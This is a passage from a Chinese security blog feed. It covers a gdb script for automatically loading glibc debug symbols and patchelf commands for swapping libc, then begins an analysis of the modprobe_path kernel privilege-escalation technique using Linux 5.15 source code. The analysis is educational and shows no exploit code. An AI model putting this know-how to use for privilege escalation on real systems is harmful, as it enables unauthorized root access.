<p>一般来说，我们用<code>glibc-all-in-one</code>下载到的glibc都是连带着<code>.debug</code>一起下的，但我们pwndbg会找不到目标的符号文件。我们可以直接在gdb中用<code>add-symbol-file /path/to/.debug</code>来读取符号信息。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123105847709.png"
                      class=""
                >
<p>或者也可以在<code>~/.gdbinit</code>中加一个<code>set debug-file-directory /path/to/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/.debug/</code>，然后进入gdb时就会自动检索到<code>.debug</code>文件，附加调试符号信息。</p>
<h4 id="自动化进行附加符号文件">自动化进行附加符号文件</h4>
<p>既然我们已经知道了手动附加的原理，这里我们就可以尝试使用脚本进行自动化附加。这里我们选择用gdb中的<code>info proc mappings</code>命令来获取libc的基址以及路径，后续.debug文件路径的判断也是基于此。所以我们想要附加生效，就要链接到glibc-all-in-one中的libc。</p>
<p>在gdbinit中加入如下命令，这里使用了<code>gdb.events.stop.connect</code>来使gdb在停下来的时候调用函数进行加载<code>symbol file</code>，这是因为gdb.attach(p)时，<code>.gdbinit</code>是先加载后再把gdb附加到进程的，如果直接调用会报错。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">DEBUG_FILE_DIR = <span class="string">&quot;/home/collectcrop/glibc_run/glibc-all-in-one/libs&quot;</span></span><br><span class="line">symbols_loaded = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_build_id</span>(<span class="params">lib_path</span>):</span><br><span class="line">    <span class="comment">#从给定的库路径提取 build-id</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#用外部命令获取build id</span></span><br><span class="line">        res = subprocess.check_output(</span><br><span class="line">            <span class="string">f&quot;readelf -n <span class="subst">&#123;lib_path&#125;</span> | grep &#x27;Build ID&#x27;&quot;</span>, </span><br><span class="line">            shell=<span class="literal">True</span>, </span><br><span class="line">            text=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 提取 Build ID 字符串</span></span><br><span class="line">        build_id = res[res.find(<span class="string">&#x27;:&#x27;</span>)+<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Build ID: <span class="subst">&#123;build_id&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> build_id</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> gdb.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error extracting build-id for <span class="subst">&#123;lib_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_debug_symbols</span>():</span><br><span class="line">    <span class="keyword">global</span> symbols_loaded</span><br><span class="line">    mappings = gdb.execute(<span class="string">&quot;info proc mappings&quot;</span>, to_string=<span class="literal">True</span>).splitlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> mappings:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;/libc.so&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            parts = line.split()</span><br><span class="line">            libc_path = parts[-<span class="number">1</span>]</span><br><span class="line">            libc_base = parts[<span class="number">0</span>]</span><br><span class="line">            build_id = get_build_id(libc_path)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> build_id:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Could not determine Build ID for libc.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">            DEBUG_FILE_DIR = libc_path.replace(<span class="string">&quot;/libc.so.6&quot;</span>, <span class="string">&quot;/.debug/.build-id&quot;</span>)</span><br><span class="line">            <span class="comment"># 解析 .debug 文件路径</span></span><br><span class="line">            debug_file_path = os.path.join(</span><br><span class="line">                DEBUG_FILE_DIR,</span><br><span class="line">                build_id[:<span class="number">2</span>],</span><br><span class="line">                build_id[<span class="number">2</span>:].replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>) + <span class="string">&quot;.debug&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] debug file: <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(DEBUG_FILE_DIR):</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(debug_file_path):</span><br><span class="line">                    gdb.execute(<span class="string">f&quot;add-symbol-file <span class="subst">&#123;debug_file_path&#125;</span> <span class="subst">&#123;libc_base&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Loaded symbols for <span class="subst">&#123;libc_path&#125;</span> from <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[-] Debug file not found: <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Build ID directory not found: <span class="subst">&#123;DEBUG_FILE_DIR&#125;</span>&quot;</span>)</span><br><span class="line">            symbols_loaded = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 延迟加载符号，确保附加到进程后运行</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_stop</span>(<span class="params">event</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> symbols_loaded:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Target process stopped. Attempting to load symbols...&quot;</span>)</span><br><span class="line">        load_debug_symbols()</span><br><span class="line"></span><br><span class="line">gdb.events.stop.connect(on_stop)</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后就能愉快地调试了，好耶。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123121652093.png"
                      class=""
                >
<h4 id="一般换库步骤">一般换库步骤</h4>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">strings ./libc.so.6  | grep &#x27;GNU&#x27;		#看给的libc版本</span><br><span class="line">ldd ./binary							#看程序动态链接库的情况</span><br><span class="line">patchelf --replace-needed original_libc target_libc ./binary	#换libc，original_libc由上面ldd能看到</span><br><span class="line">patchelf --set-interpreter target_ld ./binary					#换ld</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>debug</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>gdb</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解modprobe_path提权方式</title>
    <url>/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h2
id="深入理解modprobe_path提权方式">深入理解modprobe_path提权方式</h2>
<h4 id="源码分析">源码分析</h4>
<p>我们在调用<strong>execve</strong>去执行一个程序时，实际上会先检查目标文件是否是一个可执行文件，</p>
<p>以<strong>linux-5.15.153</strong>版本的内核源码为例，我们的目标调用链主要为<code>do_execve-&gt;do_execveat_common-&gt;bprm_execve-&gt;exec_binprm-&gt;search_binary_handler-&gt;request_module-&gt;call_modprobe-&gt;call_usermodehelper_setup/call_usermodehelper_exec</code>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">search_binary_handler</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">bool</span> need_retry = IS_ENABLED(CONFIG_MODULES);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">linux_binfmt</span> *<span class="title">fmt</span>;</span></span><br><span class="line">	<span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">	retval = prepare_binprm(bprm);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">	retval = security_bprm_check(bprm);</span><br><span class="line">	<span class="keyword">if</span> (retval)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">	retval = -ENOENT;</span><br><span class="line"> retry:</span><br><span class="line">	read_lock(&amp;binfmt_lock);</span><br><span class="line">	list_for_each_entry(fmt, &amp;formats, lh) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!try_module_get(fmt-&gt;module))</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		read_unlock(&amp;binfmt_lock);</span><br><span class="line"></span><br><span class="line">		retval = fmt-&gt;load_binary(bprm);</span><br><span class="line"></span><br><span class="line">		read_lock(&amp;binfmt_lock);</span><br><span class="line">		put_binfmt(fmt);</span><br><span class="line">		<span class="keyword">if</span> (bprm-&gt;point_of_no_return || (retval != -ENOEXEC)) &#123;</span><br><span class="line">			read_unlock(&amp;binfmt_lock);</span><br><span class="line">			<span class="keyword">return</span> retval;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	read_unlock(&amp;binfmt_lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (need_retry) &#123;</span><br><span class="line">		<span class="keyword">if</span> (printable(bprm-&gt;buf[<span class="number">0</span>]) &amp;&amp; printable(bprm-&gt;buf[<span class="number">1</span>]) &amp;&amp;</span><br><span class="line">		    printable(bprm-&gt;buf[<span class="number">2</span>]) &amp;&amp; printable(bprm-&gt;buf[<span class="number">3</span>]))</span><br><span class="line">			<span class="keyword">return</span> retval;</span><br><span class="line">		<span class="keyword">if</span> (request_module(<span class="string">&quot;binfmt-%04x&quot;</span>, *(ushort *)(bprm-&gt;buf + <span class="number">2</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> retval;</span><br><span class="line">		need_retry = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">goto</span> retry;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request_module(mod...) __request_module(true, mod)</span></span><br><span class="line"><span class="type">int</span> __request_module(<span class="type">bool</span> wait, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">	va_list args;</span><br><span class="line">	<span class="type">char</span> module_name[MODULE_NAME_LEN];</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We don&#x27;t allow synchronous module loading from async.  Module</span></span><br><span class="line"><span class="comment">	 * init may invoke async_synchronize_full() which will end up</span></span><br><span class="line"><span class="comment">	 * waiting for this task which already is waiting for the module</span></span><br><span class="line"><span class="comment">	 * loading to complete, leading to a deadlock.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	WARN_ON_ONCE(wait &amp;&amp; current_is_async());</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!modprobe_path[<span class="number">0</span>])</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">	va_start(args, fmt);</span><br><span class="line">	ret = vsnprintf(module_name, MODULE_NAME_LEN, fmt, args);</span><br><span class="line">	va_end(args);</span><br><span class="line">	<span class="keyword">if</span> (ret &gt;= MODULE_NAME_LEN)</span><br><span class="line">		<span class="keyword">return</span> -ENAMETOOLONG;</span><br><span class="line"></span><br><span class="line">	ret = security_kernel_module_request(module_name);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (atomic_dec_if_positive(&amp;kmod_concurrent_max) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		pr_warn_ratelimited(<span class="string">&quot;request_module: kmod_concurrent_max (%u) close to 0 (max_modprobes: %u), for module %s, throttling...&quot;</span>,</span><br><span class="line">				    <span class="type">atomic_read</span>(&amp;kmod_concurrent_max),</span><br><span class="line">				    MAX_KMOD_CONCURRENT, module_name);</span><br><span class="line">		ret = wait_event_killable_timeout(kmod_wq,</span><br><span class="line">						  atomic_dec_if_positive(&amp;kmod_concurrent_max) &gt;= <span class="number">0</span>,</span><br><span class="line">						  MAX_KMOD_ALL_BUSY_TIMEOUT * HZ);</span><br><span class="line">		<span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">			pr_warn_ratelimited(<span class="string">&quot;request_module: modprobe %s cannot be processed, kmod busy with %d threads for more than %d seconds now&quot;</span>,</span><br><span class="line">					    module_name, MAX_KMOD_CONCURRENT, MAX_KMOD_ALL_BUSY_TIMEOUT);</span><br><span class="line">			<span class="keyword">return</span> -ETIME;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret == -ERESTARTSYS) &#123;</span><br><span class="line">			pr_warn_ratelimited(<span class="string">&quot;request_module: sigkill sent for modprobe %s, giving up&quot;</span>, module_name);</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	trace_module_request(module_name, wait, _RET_IP_);</span><br><span class="line"></span><br><span class="line">	ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);		<span class="comment">// here</span></span><br><span class="line"></span><br><span class="line">	<span class="type">atomic_inc</span>(&amp;kmod_concurrent_max);</span><br><span class="line">	wake_up(&amp;kmod_wq);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;TERM=linux&quot;</span>,</span><br><span class="line">		<span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="type">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!argv)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!module_name)</span><br><span class="line">		<span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line"></span><br><span class="line">free_module_name:</span><br><span class="line">	kfree(module_name);</span><br><span class="line">free_argv:</span><br><span class="line">	kfree(argv);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> subprocess_info *<span class="title function_">call_usermodehelper_setup</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">		<span class="type">char</span> **envp, <span class="type">gfp_t</span> gfp_mask,</span></span><br><span class="line"><span class="params">		<span class="type">int</span> (*init)(<span class="keyword">struct</span> subprocess_info *info, <span class="keyword">struct</span> cred *new),</span></span><br><span class="line"><span class="params">		<span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> subprocess_info *info),</span></span><br><span class="line"><span class="params">		<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">sub_info</span>;</span></span><br><span class="line">	sub_info = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> subprocess_info), gfp_mask);</span><br><span class="line">	<span class="keyword">if</span> (!sub_info)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	INIT_WORK(&amp;sub_info-&gt;work, call_usermodehelper_exec_work);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_STATIC_USERMODEHELPER</span></span><br><span class="line">	sub_info-&gt;path = CONFIG_STATIC_USERMODEHELPER_PATH;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	sub_info-&gt;path = path;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	sub_info-&gt;argv = argv;</span><br><span class="line">	sub_info-&gt;envp = envp;</span><br><span class="line"></span><br><span class="line">	sub_info-&gt;cleanup = cleanup;</span><br><span class="line">	sub_info-&gt;init = init;</span><br><span class="line">	sub_info-&gt;data = data;</span><br><span class="line">  out:</span><br><span class="line">	<span class="keyword">return</span> sub_info;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(call_usermodehelper_setup);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">call_usermodehelper_exec</span><span class="params">(<span class="keyword">struct</span> subprocess_info *sub_info, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">	DECLARE_COMPLETION_ONSTACK(done);</span><br><span class="line">	<span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!sub_info-&gt;path) &#123;</span><br><span class="line">		call_usermodehelper_freeinfo(sub_info);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line">	helper_lock();</span><br><span class="line">	<span class="keyword">if</span> (usermodehelper_disabled) &#123;</span><br><span class="line">		retval = -EBUSY;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If there is no binary for us to call, then just return and get out of</span></span><br><span class="line"><span class="comment">	 * here.  This allows us to set STATIC_USERMODEHELPER_PATH to &quot;&quot; and</span></span><br><span class="line"><span class="comment">	 * disable all call_usermodehelper() calls.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strlen</span>(sub_info-&gt;path) == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Set the completion pointer only if there is a waiter.</span></span><br><span class="line"><span class="comment">	 * This makes it possible to use umh_complete to free</span></span><br><span class="line"><span class="comment">	 * the data structure in case of UMH_NO_WAIT.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	sub_info-&gt;complete = (wait == UMH_NO_WAIT) ? <span class="literal">NULL</span> : &amp;done;</span><br><span class="line">	sub_info-&gt;wait = wait;</span><br><span class="line"></span><br><span class="line">	queue_work(system_unbound_wq, &amp;sub_info-&gt;work);</span><br><span class="line">	<span class="keyword">if</span> (wait == UMH_NO_WAIT)	<span class="comment">/* task has freed sub_info */</span></span><br><span class="line">		<span class="keyword">goto</span> unlock;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (wait &amp; UMH_KILLABLE) &#123;</span><br><span class="line">		retval = wait_for_completion_killable(&amp;done);</span><br><span class="line">		<span class="keyword">if</span> (!retval)</span><br><span class="line">			<span class="keyword">goto</span> wait_done;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* umh_complete() will see NULL and free sub_info */</span></span><br><span class="line">		<span class="keyword">if</span> (xchg(&amp;sub_info-&gt;complete, <span class="literal">NULL</span>))</span><br><span class="line">			<span class="keyword">goto</span> unlock;</span><br><span class="line">		<span class="comment">/* fallthrough, umh_complete() was already called */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wait_for_completion(&amp;done);</span><br><span class="line">wait_done:</span><br><span class="line">	retval = sub_info-&gt;retval;</span><br><span class="line">out:</span><br><span class="line">	call_usermodehelper_freeinfo(sub_info);</span><br><span class="line">unlock:</span><br><span class="line">	helper_unlock();</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(call_usermodehelper_exec);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>主要触发执行的程序的函数是<strong>call_usermodehelper_exec</strong>中，<strong>call_usermodehelper_setup</strong>会根据我们传入的<strong>modprobe_path</strong>来构建一个<strong>subprocess_info</strong>结构体，然后传给<strong>call_usermodehelper_exec</strong>执行。实际上<strong>call_usermodehelper_exec</strong>只是调用<code>queue_work(system_unbound_wq, &amp;sub_info-&gt;work);</code>来将我们前面的<strong>info</strong>结构体的<strong>work</strong>域指向的回调函数加入到内核的工作队列。利用工作队列的原因在于，直接从内核上下文调用用户空间程序存在很多限制（例如可能没有进程上下文，无法睡眠等），所以通常用一个内核线程去处理这件事。</p>
<p>然后我们看前面<strong>setup</strong>函数是怎么设置<strong>work</strong>的，主要是执行<code>INIT_WORK(&amp;sub_info-&gt;work, call_usermodehelper_exec_work);</code>这一句，用一个宏来设置好<strong>work</strong>域。其回调函数就是<strong>call_usermodehelper_exec_work</strong>。然后我们看<strong>call_usermodehelper_exec_work</strong>函数的具体实现。其中用了<strong>kernel_thread</strong>来启动一个新的内核线程。启动函数是<strong>call_usermodehelper_exec_async</strong>，而且传入了之前用<strong>setup</strong>设置好的<strong>sub_info</strong>作为参数，<code>container_of(work, struct subprocess_info, work)</code>这是一个经典的
<strong>从结构体成员指针拿到其宿主结构体</strong> 的宏，可以从当前
<code>work_struct *work</code> 指针，<strong>反推出</strong> 这个
<code>work</code> 是哪个 <code>subprocess_info</code>
结构体里的成员。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">call_usermodehelper_exec_work</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">subprocess_info</span> *sub_info =</span><br><span class="line">		<span class="built_in">container_of</span>(work, <span class="keyword">struct</span> subprocess_info, work);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sub_info-&gt;wait &amp; UMH_WAIT_PROC) &#123;</span><br><span class="line">		<span class="built_in">call_usermodehelper_exec_sync</span>(sub_info);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="type">pid_t</span> pid;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Use CLONE_PARENT to reparent it to kthreadd; we do not</span></span><br><span class="line"><span class="comment">		 * want to pollute current-&gt;children, and we need a parent</span></span><br><span class="line"><span class="comment">		 * that always ignores SIGCHLD to ensure auto-reaping.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		pid = <span class="built_in">kernel_thread</span>(call_usermodehelper_exec_async, sub_info,</span><br><span class="line">				    CLONE_PARENT | SIGCHLD);</span><br><span class="line">		<span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			sub_info-&gt;retval = pid;</span><br><span class="line">			<span class="built_in">umh_complete</span>(sub_info);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后我们看一下具体调用的<strong>call_usermodehelper_exec_async</strong>函数做了什么。这里实际上就是执行的具体逻辑了，首先函数会用各种自旋锁来保护线程执行，然后有<code>new = prepare_kernel_cred(current);...;commit_creds(new);</code>这个熟悉的设置新的<strong>cred</strong>结构体的操作，此时的<strong>current</strong>实际上有着root的权限，然后就是<code>retval = kernel_execve(sub_info-&gt;path,(const char *const *)sub_info-&gt;argv,(const char *const *)sub_info-&gt;envp);</code>具体进行执行了，执行的程序就是<strong>sub_info-&gt;path</strong>，也就是我们攻击的目标<strong>modprobe_path</strong>。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> get_current() (current_thread_info()-&gt;task)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> current get_current()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">call_usermodehelper_exec_async</span><span class="params">(<span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">subprocess_info</span> *sub_info = data;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">cred</span> *<span class="keyword">new</span>;</span><br><span class="line">	<span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">spin_lock_irq</span>(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line">	<span class="built_in">flush_signal_handlers</span>(current, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">spin_unlock_irq</span>(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Initial kernel threads share ther FS with init, in order to</span></span><br><span class="line"><span class="comment">	 * get the init root directory. But we&#x27;ve now created a new</span></span><br><span class="line"><span class="comment">	 * thread that is going to execve a user process and has its own</span></span><br><span class="line"><span class="comment">	 * &#x27;struct fs_struct&#x27;. Reset umask to the default.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	current-&gt;fs-&gt;umask = <span class="number">0022</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Our parent (unbound workqueue) runs with elevated scheduling</span></span><br><span class="line"><span class="comment">	 * priority. Avoid propagating that into the userspace child.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="built_in">set_user_nice</span>(current, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	retval = -ENOMEM;</span><br><span class="line">	<span class="keyword">new</span> = <span class="built_in">prepare_kernel_cred</span>(current);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">spin_lock</span>(&amp;umh_sysctl_lock);</span><br><span class="line">	<span class="keyword">new</span>-&gt;cap_bset = <span class="built_in">cap_intersect</span>(usermodehelper_bset, <span class="keyword">new</span>-&gt;cap_bset);</span><br><span class="line">	<span class="keyword">new</span>-&gt;cap_inheritable = <span class="built_in">cap_intersect</span>(usermodehelper_inheritable,</span><br><span class="line">					     <span class="keyword">new</span>-&gt;cap_inheritable);</span><br><span class="line">	<span class="built_in">spin_unlock</span>(&amp;umh_sysctl_lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sub_info-&gt;init) &#123;</span><br><span class="line">		retval = sub_info-&gt;<span class="built_in">init</span>(sub_info, <span class="keyword">new</span>);</span><br><span class="line">		<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">			<span class="built_in">abort_creds</span>(<span class="keyword">new</span>);</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">commit_creds</span>(<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wait_for_initramfs</span>();</span><br><span 